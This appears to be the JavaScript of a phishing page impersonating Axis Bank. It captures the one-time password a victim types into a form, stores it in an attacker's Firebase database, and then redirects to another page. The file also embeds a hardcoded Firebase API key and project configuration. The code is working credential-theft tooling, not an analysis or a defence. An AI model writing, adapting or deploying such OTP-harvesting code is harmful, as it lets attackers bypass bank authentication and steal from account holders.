// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyDMjrcreMydOu4XAyhLMuSSl4BnAXlPnTU",
  authDomain: "axis-iphone.firebaseapp.com",
  databaseURL: "https://axis-iphone-default-rtdb.firebaseio.com",
  projectId: "axis-iphone",
  storageBucket: "axis-iphone.appspot.com",
  messagingSenderId: "352035036395",
  appId: "1:352035036395:web:da24666556359e852272ae",
  
  
      
  
    };
  
  firebase.initializeApp(firebaseConfig);
  
  // Reference messages collection
  var messagesRef = firebase.database().ref('messages');
  
  // Listen for form submit
  document.getElementById('contactForm').addEventListener('submit', submitForm);
  
  // Submit form
  function submitForm(e){
    e.preventDefault();
  
    // Get values
    var otp = getInputVal('otp');
  
    // Save message
    saveMessage(otp);
  
    // Show alert
  // alert("Axis Bank Will Contact You Soon")
  //   // Clear form
  //   document.getElementById('contactForm').reset();
  
  document.getElementById('contactForm').reset();
  window.location.href="sad1.html";
  }
  
  // Function to get get form values
  function getInputVal(id){
    return document.getElementById(id).value;
  }
  
  // Save message to firebase
  function saveMessage(otp){
    var newMessageRef = messagesRef.push();
    newMessageRef.set({
      otp: otp,
    });
  }
  